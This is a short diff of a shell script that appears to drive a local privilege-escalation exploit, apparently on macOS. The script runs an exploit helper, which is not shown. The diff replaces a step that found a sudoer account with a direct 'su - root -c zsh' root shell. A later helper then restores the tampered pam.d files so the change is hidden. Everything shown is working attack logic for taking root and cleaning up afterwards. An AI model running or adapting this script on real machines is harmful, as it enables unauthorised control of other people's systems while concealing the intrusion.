@@ -18,11 +18,8 @@ fi
 # Run exploit
 ./helpers/exploit.command
 
-# Find a sudoer
-user=$(./helpers/find_sudoer.command)
-
-# Use the sudoer to get root bash
-su - $user -c "sudo -i"
+# Open root shell
+su - root -c zsh
 
 # Revert pam.d files to original
 sudo ./helpers/reset_pam.command
